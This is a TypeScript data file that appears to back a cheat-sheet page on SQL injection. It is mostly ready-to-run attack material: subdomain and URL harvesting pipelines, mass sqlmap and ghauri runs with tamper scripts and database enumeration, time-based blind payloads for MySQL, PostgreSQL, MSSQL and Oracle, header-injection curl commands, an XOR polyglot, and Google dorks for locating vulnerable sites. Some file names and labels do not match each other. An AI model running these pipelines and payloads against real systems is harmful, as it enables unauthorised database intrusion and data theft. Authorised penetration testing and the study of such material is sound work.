export interface SQLInjectionCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-28"
export const pageDescription = "SQL injection reconnaissance methodology using subdomain enumeration, URL discovery, mass testing and time-based payloads."

export const sqlInjectionCategories: SQLInjectionCategory[] = [
  {
    category: "Introduction",
    commands: [
      {
        command: "SQL Injection remains one of the most critical web vulnerabilities, allowing attackers to manipulate backend databases through unsanitized inputs",
        description: "SQLi overview — recon to exploitation",
      },
    ],
  },
  {
    category: "Step 1 — Recon the Target Subdomains",
    commands: [
      {
        command: "subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
        description: "Enumerate subdomains and filter dynamic pages",
      },
      {
        command: "subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'",
        description: "Bulk subdomain enumeration from a file",
      },
    ],
  },
  {
    category: "Step 2 — Discovering Potential SQLi Endpoints",
    commands: [
      {
        command: 'echo https://example.com | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "=" >urls.txt',
        description: "Gather parameterized URLs with GAU",
      },
      {
        command: 'echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" >urls2.txt',
        description: "Deep crawl with Katana for more URLs",
      },
    ],
  },
  {
    category: "Step 3 — Identify SQL-Prone URLs",
    commands: [
      {
        command: "cat urls1.txt urls2.txt | gf sqli | uro > cleaned-sql.txt",
        description: "Extract SQLi-prone URLs using gf patterns",
      },
    ],
  },
  {
    category: "Automate Mass SQL Injection Testing",
    commands: [
      {
        command: "ghauri -m cleaned-sql.txt --batch --dbs --level 3 --confirm",
        description: "Mass SQLi testing with ghauri",
      },
      {
        command: "sqlmap -m cleaned-sql.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs",
        description: "Mass SQLi testing with sqlmap",
      },
      {
        command: "subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm",
        description: "Full automation pipeline with ghauri",
      },
      {
        command: "subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent",
        description: "Full automation pipeline with sqlmap",
      },
    ],
  },
  {
    category: "Time-Based Blind SQL Injection — MySQL",
    commands: [
      {
        command: "SELECT SLEEP(10);",
        description: "Basic MySQL time-based delay",
      },
      {
        command: "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
        description: "Inline injection with logic",
      },
      {
        command: "1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(FLOOR(RAND()*2),(SELECT SLEEP(5))) AS x FROM information_schema.tables GROUP BY x) y);",
        description: "Benchmark-based delay",
      },
      {
        command: "' OR IF(1=1, SLEEP(10), 0)-- -",
        description: "Boolean logic delay",
      },
    ],
  },
  {
    category: "Time-Based Blind SQL Injection — PostgreSQL",
    commands: [
      {
        command: "SELECT pg_sleep(10);",
        description: "Standard PostgreSQL time-based delay",
      },
      {
        command: "' OR (CASE WHEN ((CLOCK_TIMESTAMP() - NOW()) < interval '0:0:10') THEN (SELECT '1' || pg_sleep(10)) ELSE '0' END)='1",
        description: "Conditional delay with string concatenation",
      },
      {
        command: "' OR 1=1; SELECT pg_sleep(5);--",
        description: "Concise PostgreSQL delay",
      },
      {
        command: "' OR (SELECT CASE WHEN (random() < 0.5) THEN pg_sleep(5) ELSE pg_sleep(0) END);--",
        description: "Variable delay with random()",
      },
    ],
  },
  {
    category: "Time-Based Blind SQL Injection — MSSQL",
    commands: [
      {
        command: "WAITFOR DELAY '00:00:10';",
        description: "Basic MSSQL delay",
      },
      {
        command: "'; WAITFOR DELAY '00:00:05'; --",
        description: "Inline SQLi payload",
      },
      {
        command: "IF (1=1) WAITFOR DELAY '0:0:10';",
        description: "Conditional delay",
      },
      {
        command: "'; IF EXISTS (SELECT * FROM users) WAITFOR DELAY '00:00:07';--",
        description: "IF EXISTS delay",
      },
    ],
  },
  {
    category: "Time-Based Blind SQL Injection — Oracle",
    commands: [
      {
        command: "BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;",
        description: "Basic Oracle time delay",
      },
      {
        command: "' OR 1=1; BEGIN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END;--",
        description: "Oracle SQLi inline payload",
      },
      {
        command: "DECLARE v INTEGER; BEGIN IF 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',10); END IF; END;",
        description: "Conditional Oracle delay",
      },
    ],
  },
  {
    category: "Header-Based SQLi Testing",
    commands: [
      {
        command: 'time curl -s -H "User-Agent: 0\'XOR(if(now()=sysdate(),sleep(10),0))XOR\'Z" "https://target.com/vulnerable-endpoint"',
        description: "Test User-Agent header SQLi",
      },
      {
        command: 'time curl -s -H "X-Forwarded-For: 0\'XOR(if(now()=sysdate(),sleep(10),0))XOR\'Z" "https://target.com/vulnerable-endpoint"',
        description: "Test X-Forwarded-For header SQLi",
      },
      {
        command: "time curl -s -H \"Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'\\\" \"https://target.com/vulnerable-endpoint\"",
        description: "Test Referer header SQLi",
      },
    ],
  },
  {
    category: "XOR-Based SQLi Techniques",
    commands: [
      {
        command: "if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'\"XOR(if(now()=sysdate(),sleep(10),0))OR\"*/",
        description: "XOR polyglot payload",
      },
      {
        command: 'time curl "https://target.com/page.php?id=if(now()=sysdate(),sleep(10),0)/*\'XOR(if(now()=sysdate(),sleep(10),0))OR\'"XOR(if(now()=sysdate(),sleep(10),0))OR"*/"',
        description: "Test XOR polyglot payload via curl",
      },
    ],
  },
  {
    category: "Google Dorking for SQL Injection",
    commands: [
      {
        command: "site:*.domain.com inurl:id=",
        description: "Find URLs with query parameters",
      },
      {
        command: "site:*.domain.com inurl:product.php?id=",
        description: "Find product pages with id parameter",
      },
      {
        command: "site:*.domain.com ext:php inurl:id=",
        description: "Combine extension + parameters",
      },
      {
        command: 'site:*.domain.com intext:"You have an error in your SQL syntax"',
        description: "Error-based fingerprinting — MySQL",
      },
      {
        command: 'site:*.domain.com intext:"Microsoft OLE DB Provider for SQL Server"',
        description: "Error-based fingerprinting — MSSQL",
      },
      {
        command: 'site:*.domain.com intext:"ORA-00933: SQL command not properly ended"',
        description: "Error-based fingerprinting — Oracle",
      },
    ],
  },
]
